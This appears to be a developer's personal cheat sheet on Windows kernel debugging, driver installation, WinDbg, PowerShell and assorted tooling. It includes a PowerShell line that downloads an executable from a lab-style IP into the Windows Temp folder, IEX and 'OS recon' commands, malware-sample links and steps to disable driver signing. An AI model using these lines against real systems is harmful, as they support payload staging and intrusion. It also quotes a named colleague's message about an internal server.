- Use the snapshot
- Start from vmmon64.exe and run debugger (windbg)
- Restart
- At boot always use that special boot option but press F8 instead of ENTER
- Choose Disable Driver Signature Enforcement
- hit g when windbg breaks

## About kernel functions
https://www.geoffchappell.com/studies/windows/km/index.htm

https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/attaching-to-a-virtual-machine--kernel-mode-
https://github.com/repnz/windbg-cheat-sheet
https://reverseengineering.stackexchange.com/questions/16685/how-can-i-receive-dbgprint-messages-in-windbg-on-windows-10
https://blahcat.github.io/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging/
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/compiling-first-kernel-driver-kdprint-dbgprint-and-debugview
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/loading-a-windows-kernel-driver-osr-driver-loader-debugging-with-source-code
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals

Kernel debugging!!! Very good link, use this:
https://github.com/repnz/windbg-cheat-sheet

## kerneldebugging with vmware



https://stackoverflow.com/questions/33820520/kernel-debug-with-a-vmware-machine

```
bcdedit /set testsigning on
#bcdedit -set nointegritychecks ON
bcdedit /debug on
bcdedit /dbgsettings serial debugport:1 baudrate:115200
or
bcdedit /debug on
bcdedit /dbgsettings serial debugport:2 baudrate:115200

Type to check if debug is on: 
bcdedit /enum

Type the below path to pipe to VirtuaBox Serial Port COM1/Host Pipe
\\.\pipe\myvbox
Uncheck Connect to existing pipe/socket
Start first WinDbg with Admin and Kernel Debug...->COM->Port:
\\.\pipe\myvbox
Also check Pipe and Reconnect
In WinDbg to get all the DbgPrint() messages type:
ed nt!Kd_Default_Mask 0xf
ed nt!Kd_IHVDRIVER_Mask 0xf
```

Set
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter
to DWORD
Path	HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter
Name	DEFAULT
Type	REG_DWORD
Value	0xF

# Register driver (#driver, #windowsdriver)
right click 'Install' on nullFilter.inf
sc.exe start nullFilter

# New way to install the driver !!! (devcon)
https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver

In the .inf file place:
```
[Standard.NT$ARCH$]
%KmdfHelloWorld.DeviceDesc%=KmdfHelloWorld_Device, Root\KmdfHelloWorld
```

Copy .sys file to C:\Windows\System32\drivers
then

```
devcon install <INF file> <hardware ID>
```
```
devcon install kmdfhelloworld.inf root\kmdfhelloworld
```

```
#name is the filename of the .sys file
function Install-Driver($name)
{
	# devcon install <INF file> <hardware ID>
	$cleanName = $name -replace ".sys|.\\", ""
	.\devcon.exe install $cleanName".inf" Root\$cleanName
}
```
```
function Remove-Driver($name)
{
    .\devcon.exe remove Root\$name
}

function Update-Driver($sysfile)
{
	$cleanName = $sysfile -replace ".sys|.\\", ""
	echo "Removing driver $cleanName"
	Remove-Driver $cleanName
	echo "Installing driver $sysfile"
	Install-Driver $sysfile
}
```

# PS script - place in your $profile

```
function Install-Driver($name)
{
	$cleanName = $name -replace ".sys|.\\", ""

	sc.exe stop $cleanName
	sc.exe delete $cleanName

	cp $name c:\windows\system32\drivers\ -verbose -force
	sc.exe create $cleanName type= kernel start= demand error= normal binPath= c:\windows\System32\Drivers\$cleanName.sys DisplayName= $cleanName

	sc.exe start $cleanName
}
```

# filter will be the name - register
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create
sc create filter type= filesys start= demand binpath= C:\Users\bodge\Desktop\nullFilter.sys
sc.exe start filter
sc.exe stop filter
sc.exe delete filter

## devcon.exe

"%WindowsSdkDir%\tools\x64\devcon.exe" help
"%WindowsSdkDir%\tools\x64\devcon.exe" install .\K_MSRs.inf Root\K_MSRs
"%WindowsSdkDir%\tools\x64\devcon.exe" remove .\K_MSRs.inf Root\K_MSRs

WinDbg (#windbg)
---------------
List of commands:
https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/commands

Good resource:
https://fishilico.github.io/generic-config/windows/windbg-kd.html

### Symbols

https://stackoverflow.com/questions/30019889/how-to-set-up-symbols-in-windbg

Most of the time (80% use case)
.symfix+ c:\symbols
.reload

This works well:
!sym noisy
.sympath C:\dev\out\win7-64bit-ninja\servers;SRV*c:\symbols*http://msdl.microsoft.com/download/symbols
.reload /f

More advanced:
.sympath c:\mysymbols ; *** Symbols of your application, locally, flat list of PDB files
.sympath+ cache*c:\symbolcache ; *** (optional) Create a cache for everything
.sympath+ \\server\symbols ; *** Symbols provided from a network share
.symfix+ c:\symbols ; *** Microsoft symbols

Or in the menu (File/Symbol File Path...) or ctrl+s:
c:\mysymbols;cache*c:\symbolcache;\\server\symbols;SRV*c:\symbols*http://msdl.microsoft.com/download/symbols

Or by environment var (_NT_SYMBOL_PATH)
c:\mysymbols;cache*c:\symbolcache;\\server\symbols;SRV*c:\symbols*http://msdl.microsoft.com/download/symbols

dd [location/variable] - dissassembly data at variable
bp $exentry - break on entry
bm /a elamsample!Elam* - pattern based breakpoint set
bl - list breakpoints
p - step over
t - step into
gu - step out
tt - resume until return
.sympath - symbol path query and setting
.reload /f - load with symbols
.restart
q - quit/stop debugging session
g - resume,go
u $exentry - disassemble the entry point
uf <address> - disassemble as function
lm - list loaded modules
`x nt!KiSystemService*` - list symbols starting with...
.load,.loadby - Load library
~8s - switch to thread 8 (display thread ids by using the '~')

## kernelmode windbg

- .reload
- .reload /f

- `bp /p <address of EPROCESS> ntdll!NtCreateThreadEx`
How to get EPROCESS address?
- `!process <pid>` - pid should be in hexidecimal!
After this grab the address after PROCESS in windbg output following above cmd
- `dt nt!_EPROCESS <EPROCESSADDR>`
- `? @$proc` - current EPROCESS id
- `?? @$proc->UniqueProcessId`

`dt _eprocess` - to query the EPROCESS structure
`dt _kprocess` - to query the KPROCESS structure

dt shows the structure of the struct not its contents. Specify and address if you want to
show an instance of an actual process.
`!process 0 0` - get all the EPROCESS blocks in the system
 !process 0 0 fssm32.exe - look for the process name pattern
 .process /r /p 868c07a0 - once you have the PROCESS pointer from above cmd
 lm - loaded modules

Links:
https://stackoverflow.com/questions/11106402/dumping-eprocess-with-windbg
https://reverseengineering.stackexchange.com/questions/16474/getting-the-current-process-in-windows

### Log messages (kernel logging)

Enter these into WinDbg command window:
```
ed nt!Kd_Default_Mask 0xf
ed nt!Kd_IHVDRIVER_Mask 0xf
```

After this the log messages should appear in the Command window.

## Current process information
!process -1 0

## Switch to userspace process?
!process 0 0 notepad.exe
.process /r /p <ProcAddress>
## Switch to kernel mode
.process /k

## switch to a given thread
~8s
The above will switch to thread number 8.

## Stack frames
### change stack fram context
.frame /c
### inspect registers of the stack frame
.frame /r

## Break on system call when specific process initiates it
!process 0 0 notepad.exe
bp /p ffffbe8e593d3080 nt!NtCreateFile


## windbg extensions

### View various system callbacks, system tables, object types
https://github.com/swwwolf/wdbgark

## windows kernel systemcall

### Syscall numbers
https://j00ru.vexillium.org/syscalls/nt/64/

### Syscalls explained
https://www.n4r1b.com/posts/2019/03/system-calls-on-windows-x64/

### Hooking systemcalls
https://resources.infosecinstitute.com/topic/hooking-system-service-dispatch-table-ssdt/#gref

nt!KiSystemServiceUser is the entry point when `syscall` executes.

### Python extension for windbg
https://github.com/SeanCline/PyExt


### Scripting windbg

Use $t0, $t1 etc pseudoregisters

Loop through callstack of many threads
Thread syntax: ~
Choose thread based on pseudoregister:
~[@$t0]

```
.for(r $t0=0; @$t0<100; r $t0=@$t0+1) { .printf "Thread %d\n", @$t0; ~[@$t0] k }
```


Powershell (#powershell)
==========

https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1
https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/3-exercise-powershell

Start on Linux by `pwsh`.

To get info on powershell:
$PSVersionTable
$PSVersionTable.PSVersion

Cmdlets:
https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/4-cmdlets


https://resources.infosecinstitute.com/topic/powershell-for-pentesters-part-1-introduction-to-powershell-and-cmdlets/

Important commands
------------------

gcm *event* - Search fuzzily for commands containing event
help *event* - get fuzzy help
ft - format table 
ft -wrap    -> to expand the ... 
select      -> Select-Object

Examples
--------

### Linux equivalents

- wc -l
- Measure-Object -Line

- grep
- findstr OR get-content + select-string
- Get-Content .\doc.txt | Select-String -Pattern (Get-Content .\regex.txt)




```bash
Try fuzzy find some command:
get-help *alia*
Get-Command *alia*

Basic OS recon: (use Get-WmiObject)
Link: https://adamtheautomator.com/get-wmiobject/

Get-WmiObject -Class win32_OperatingSystem | select *
Get-WmiObject -Class win32_process | select *
Get-WmiObject -Class win32_service | select *
Get-WmiObject -Class win32_bios | select *


get-help get-service -examples
Get-Service | Where-Object {$_.Status -eq "Running"}
ls | Get-Member -MemberType * | Select-Object MemberType
Print processes - name and id
foreach($proc in Get-Process) { $name = $proc.ProcessName; $id = $proc.Id; echo "$name $id" }
Display each process's name
Get-Process | ForEach-Object ProcessName

Invoke-Expression - runs command from string:
Invoke-Expression "echo HI"
IEX "echo HI"
echo 'iex "echo HI"' | powershell -noprofile -

Filtering result:
https://www.concurrency.com/blog/august-2018/powershell-basics-filtering-and-selecting
Get-Process | Where-Object {$_.WorkingSet -gt 100000000}
Get-Command *schedule* | ? {$_.Name -like "Get*"}
Get-ChildItem | Select-Object -First 5
Get-Process | Select-Object -Property Name, Id

Find out all the property list for object:
Get-Service | Format-List *

Get the threads of a given process
(Get-Process -Name vim).Threads
(Get-Process -Name vim).Threads | ForEach-Object { $_.ThreadState }
foreach($proc in (Get-Process -Name "chrome")) { $id=$proc.Id; echo "#### $id ######"; $proc.Threads|ForEach-Object Id }
Finding certain files: 
Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
Get-ChildItem -Path C:\ -Filter *.doc -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }

% means Foreach-Object:
Get-ChildItem | % { echo $_.name }

Write many variables:
Get-ChildItem | % { Write-Host $_.Length $_.Name -Separator "`t" }

Where-Object: to filter out the objects coming from the pipeline ( ? is the alias)
get-ChildItem| ? {$_.length –gt 10000000 | % {write-host $_.length $_.name -separator "`t`t"}

Filtering(?) and Foreach-ing(%):
Get-ChildItem | ? { $_.Length -le 18 } | % { write-host $_.Length $_.Name -Separator "`t`t" }

Show all the members of the object
Get-ChildItem .\MsMpEng.exe | Select-Object *

Use a hashmap to count number of distinct verb commands we have
$counts=@{}; foreach($verb in (Get-Command | % Verb)) { $counts[$verb]+=1 }; $counts.GetEnumerator() | Sort-Object -Property Value -Descending

Downloading from web:
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
$res = (New-Object Net.WebClient).DownloadString("https://index.hu")
Invoke-WebRequest "https://index.hu/" -OutFile .\Downloads\index.html

List admin accounts:
Get-LocalGroupMember Administrators

Clipboard access:
Get-Clipboard

Processes:
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id

Services:
Get-Service
Get-Service | ? Status -like Running

Network interfaces:
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft


```


Bash -> Powershell
==================

```bash

echo:
write-output
write-host

find . -name "poti*" -type f
Get-ChildItem -Path . -Filter "poti*" -Recurse -File 

which
function which($name)                                            
{                                                                
    Get-Command $name | Select-Object -ExpandProperty Definition 
}                                                                

rm -rf <folder>
Remove-Item –path <folder> –recurse

unalias <aliasname>
Remove-Item Alias:<aliasname>
Remove-Item Function:<functionname>

cd $TMP
cd $env:TMP

```

Competitive programming (c++, competitive)
==========================================

```cpp
#include "bits/stdc++.h"
using namespace std;
#define max(a, b) (a < b ? b : a)
#define min(a, b) ((a > b) ? b : a)
#define mod 1e9 + 7
#define FOR(a, c) for (int(a) = 0; (a) < (c); (a)++)
#define FORL(a, b, c) for (int(a) = (b); (a) <= (c); (a)++)
#define FORR(a, b, c) for (int(a) = (b); (a) >= (c); (a)--)
#define INF 1000000000000000003
typedef long long int ll;
typedef vector<int> vi;
typedef pair<int, int> pi;
#define F first
#define S second
#define PB push_back
#define POB pop_back
#define MP make_pair
int main()
{
    ios::sync_with_stdio(0);
    cin.tie(0);
    int T;
    cin >> T;
    while (T--) {
        int N;
        cin >> N;
        ll a[N];
        FOR(i, N)
        cin >> a[i];
    }
    return 0;
}
```

Latency, latency
================

Latency Comparison Numbers
--------------------------
L1 cache reference                           0.5 ns
Branch mispredict                            5   ns
L2 cache reference                           7   ns                      14x L1 cache
Mutex lock/unlock                           25   ns
Main memory reference                      100   ns                      20x L2 cache, 200x L1 cache
Compress 1K bytes with Zippy            10,000   ns       10 us
Send 1 KB bytes over 1 Gbps network     10,000   ns       10 us
Read 4 KB randomly from SSD*           150,000   ns      150 us          ~1GB/sec SSD
Read 1 MB sequentially from memory     250,000   ns      250 us
Round trip within same datacenter      500,000   ns      500 us
Read 1 MB sequentially from SSD*     1,000,000   ns    1,000 us    1 ms  ~1GB/sec SSD, 4X memory
HDD seek                            10,000,000   ns   10,000 us   10 ms  20x datacenter roundtrip
Read 1 MB sequentially from 1 Gbps  10,000,000   ns   10,000 us   10 ms  40x memory, 10X SSD
Read 1 MB sequentially from HDD     30,000,000   ns   30,000 us   30 ms 120x memory, 30X SSD
Send packet CA->Netherlands->CA    150,000,000   ns  150,000 us  150 ms

Notes
-----
1 ns = 10^-9 seconds
1 us = 10^-6 seconds = 1,000 ns
1 ms = 10^-3 seconds = 1,000 us = 1,000,000 ns

Visualization of latency numbers
--------------------------------
https://gist.github.com/hellerbarde/2843375



Visual Studio compilation (visualstudio compile manual)
========================================================

Open Visual Studio command prompt (either x64 or x86)

Tools:

* cl
* ml
* ml64
* link
* dumpbin

```
cl /c /FA demo.cpp (compiles to assembly too)
link demo.obj /defaultlib:user32.lib /out:demo_cpp.exe
```

```
ml64 /c demo64.asm
link demo64.obj /subsystem:console /defaultlib:kernel32.lib /defaultlib:user32.lib /entry:main /out:demo64_masm.exe
```

cl: compile cpp file
ml or ml64: assemble masm file (ml64 /c filename.asm)
link: link object files into executable (link filename.obj /entry:main)

## view exports (inspect binary like objdump instead called dumpbin)
https://stackoverflow.com/questions/50978611/how-do-you-identify-exported-functions-in-a-windows-static-library
dumbbin /exports ntdll.dll
dumpbin /symbols ntdll.dll
dumpbin /directives ntdll.dll

# Remapping capslock (caps lock) to be a ctrl key

## Windows
https://gist.github.com/joshschmelzle/5e88dabc71014d7427ff01bca3fed33d

### Powershell as admin
https://renenyffenegger.ch/notes/Windows/registry/tree/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Keyboard-Layout/index

$hexified = "00,00,00,00,00,00,00,00,02,00,00,00,1d,00,3a,00,00,00,00,00".Split(',') | % { "0x$_"};
$kbLayout = 'HKLM:\System\CurrentControlSet\Control\Keyboard Layout';
New-ItemProperty -Path $kbLayout -Name "Scancode Map" -PropertyType Binary -Value ([byte[]]$hexified);

### Registry file

Create a new .reg file and name it something meaningful like capstoctrl.reg. Edit the file and paste in the following:

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]
"Scancode Map"=hex:00,00,00,00,00,00,00,00,02,00,00,00,1d,00,3a,00,00,00,00,00

Hyper-V vs VMWare (#vmware)
===========================

After Hyper-V installation old VMWare live snapshots won't work.
Do this:

bcdedit /set hypervisorlaunchtype off

Then restart.





WinRt(cppwinrt, #winrt)
=======================

https://www.youtube.com/watch?v=nOFNc2uTmGs

Build from command line:
x64 Native Tools Command Prompt for VS2019
cl.exe /nologo /EHsc /std:c++17 main.cpp /link windowsapp.lib


CreateFile (#windows, #win32)
==============================

```
This argument:           |             Exists            Does not exist
-------------------------+------------------------------------------------------
CREATE_ALWAYS            |            Truncates             Creates
CREATE_NEW         +-----------+        Fails               Creates
OPEN_ALWAYS     ===| does this |===>    Opens               Creates
OPEN_EXISTING      +-----------+        Opens                Fails
TRUNCATE_EXISTING        |            Truncates              Fails
```


Malware (#malware)
==================

https://bazaar.abuse.ch/browse
tag:AgentTesla, tag:TrickBot

Download a zip full of malware:
https://datalake.abuse.ch/malware-bazaar/

(Url for signatures to set to: https://upgrade.bitdefender.com/)


Visual Studio (#visualstudio)
=============================

Word Highlight settings:

Lightmode:
Occurences Background Color:
192, 192, 255
Occurences Border Color:
0, 0, 255

Select Background Color:
255, 224, 192
Select Border Color:
0, 0, 255

WerFault.exe (Windows Error reporting, #crash, #dump)
=====================================================

https://learn.microsoft.com/en-us/windows/win32/wer/collecting-user-mode-dumps
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps

https://spitfireaudio.zendesk.com/hc/en-us/articles/11727762149661-How-to-enable-crash-dumps-on-windows

Need to have this folder in registry:
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps
Under this DumpType value should be 2.


https://learn.microsoft.com/en-us/windows/win32/debug/configuring-automatic-debugging#configuring-automatic-debugging-for-application-crashes
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug
Also add the REG_SZ key: Auto with value 1
Original value in Debugger:
"C:\WINDOWS\system32\vsjitdebugger.exe" -p %ld -e %ld
or after vs2022 "C:\WINDOWS\system32\vsjitdebugger.exe" -p %ld -e %ld -j 0x%p
change to:
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" -p %ld -e %ld -g

If automatic debugging is enabled then no crash dump is generated.


DEVBMS SureSense
================

[16:36] Bingham, Joseph

I can't find a confluence page, but basically you need to point your endpoint at https://devbms.bromium.net/ (either when you run the installer; SERVERURL=https://devbms.bromium.net/) or change it with BrManage.exe management-server (print|del|<address>), then go to the controller in your browser and under Device Security go to Device Groups. Add a new group (I just named mine Joe's Group) and add either the Published Channels - EARLY SAE + SCE or the Published Channels - GA SAE + SCE group to it (I think SAE is every sprint and GA is less frequent). Next, under Device Security, go to Devices, find your device, and click it. Top-right select Device Groups and add your device to your group. Then you can go to Policies under Configuration and create a new policy and apply it to your group.
